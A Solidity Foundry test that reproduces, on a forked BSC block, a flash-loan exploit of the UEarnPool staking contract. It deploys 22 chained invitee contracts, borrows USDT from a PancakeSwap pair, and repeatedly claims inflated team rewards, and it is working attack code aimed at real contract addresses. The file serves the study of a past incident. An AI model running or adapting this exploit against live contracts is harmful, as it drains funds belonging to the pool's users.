// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/CertiKAlert/status/1593094922160128000
// @Tx
// https://bscscan.com/tx/0xb83f9165952697f27b1c7f932bcece5dfa6f0d2f9f3c3be2bb325815bfd834ec
// https://bscscan.com/tx/0x824de0989f2ce3230866cb61d588153e5312151aebb1e905ad775864885cd418
// @Summary
// The key is to obtain invitation rewards, create 22 contracts, bind each other, first stake a large amount of usdt, make teamamont reach the standard of _levelConfigs[3], stake in turn, and finally claim rewards
// Reward Calculation: claimTeamReward() levelConfig
//                  if (_userInfos[account].levelClaimed[i] == 0) {
//                     if (i == 0) {
//                         levelReward = levelConfig.teamAmount * levelConfig.rewardRate / _feeDivFactor;
//                     } else {
//                         levelReward = (levelConfig.teamAmount - _levelConfigs[i - 1].teamAmount) * levelConfig.rewardRate / _feeDivFactor;
//                     }
//                     pendingReward += levelReward;
// _levelConfigs[0] = LevelConfig(100, 300000 * amountUnit, 3000 * amountUnit);         rewardRate; teamAmount; amount;
// _levelConfigs[1] = LevelConfig(300, 600000 * amountUnit, 7000 * amountUnit);
// _levelConfigs[2] = LevelConfig(500, 1200000 * amountUnit, 10000 * amountUnit);
// _levelConfigs[3] = LevelConfig(1000, 2400000 * amountUnit, 20000 * amountUnit);
// _feeDivFactor = 10000
// rewrad: 162_000 = 1_200_000 * 0.1 + 600_000 * 0.05 + 300_000 * 0.03 + 300_000 * 0.01

interface UEarnPool {
    function bindInvitor(address invitor) external;
    function stake(uint256 pid, uint256 amount) external;
    function claimTeamReward(address account) external;
}

contract claimReward {
    UEarnPool Pool = UEarnPool(0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function bind(address invitor) external {
        Pool.bindInvitor(invitor);
    }

    function stakeAndClaimReward(uint256 amount) external {
        USDT.approve(address(address(Pool)), type(uint256).max);
        Pool.stake(0, amount);
        Pool.claimTeamReward(address(this));
    }

    function withdraw(address receiver) external {
        USDT.transfer(receiver, USDT.balanceOf(address(this)));
    }
}

contract ContractTest is Test {
    UEarnPool Pool = UEarnPool(0x02D841B976298DCd37ed6cC59f75D9Dd39A3690c);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address[] contractList;

    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheat.createSelectFork("bsc", 23_120_167);
    }

    function testExploit() public {
        contractFactory();
        // bind invitor
        (bool success,) = contractList[0].call(abi.encodeWithSignature("bind(address)", tx.origin));
        require(success);
        for (uint256 i = 1; i < 22; i++) {
            (bool success,) = contractList[i].call(abi.encodeWithSignature("bind(address)", contractList[i - 1]));
            require(success);
        }

        Pair.swap(2_420_000 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        uint256 len = contractList.length;
        // LevelConfig[3].teamAmount : 2_400_000
        USDT.transfer(contractList[len - 1], 2_400_000 * 1e18);
        (bool success1,) =
            contractList[len - 1].call(abi.encodeWithSignature("stakeAndClaimReward(uint256)", 2_400_000 * 1e18));
        require(success1);
        for (uint256 i = len - 2; i > 4; i--) {
            USDT.transfer(contractList[i], 20_000 * 1e18); // LevelConfig[3].Amount : 20_000
            USDT.balanceOf(address(this));
            // 162000 - 20000 + 1500, 1500 is the reduce amount of _addInviteReward(), claim remaining USDT when USDT amount in contract less than 162_000,
            if (USDT.balanceOf(address(Pool)) < 143_500 * 1e18) {
                USDT.transfer(address(Pool), 143_500 * 1e18 - USDT.balanceOf(address(Pool)));
            }
            (bool success1,) =
                contractList[i].call(abi.encodeWithSignature("stakeAndClaimReward(uint256)", 20_000 * 1e18)); // LevelConfig[3].Amount : 20_000
            require(success1);
            (bool success2,) = contractList[i].call(abi.encodeWithSignature("withdraw(address)", address(this)));
            require(success2);
        }
        contractList[0].call(abi.encodeWithSignature("withdraw(address)", address(this))); // claim the reward from _addInviteReward()
        contractList[1].call(abi.encodeWithSignature("withdraw(address)", address(this)));
        contractList[2].call(abi.encodeWithSignature("withdraw(address)", address(this)));
        contractList[3].call(abi.encodeWithSignature("withdraw(address)", address(this)));
        contractList[4].call(abi.encodeWithSignature("withdraw(address)", address(this)));
        uint256 borrowAmount = 2_420_000 * 1e18;
        USDT.transfer(address(Pair), borrowAmount * 10_000 / 9975 + 1000);
    }

    function contractFactory() public {
        address _add;
        bytes memory bytecode = type(claimReward).creationCode;
        for (uint256 _salt = 0; _salt < 22; _salt++) {
            assembly {
                _add := create2(0, add(bytecode, 32), mload(bytecode), _salt)
            }
            contractList.push(_add);
        }
    }
}
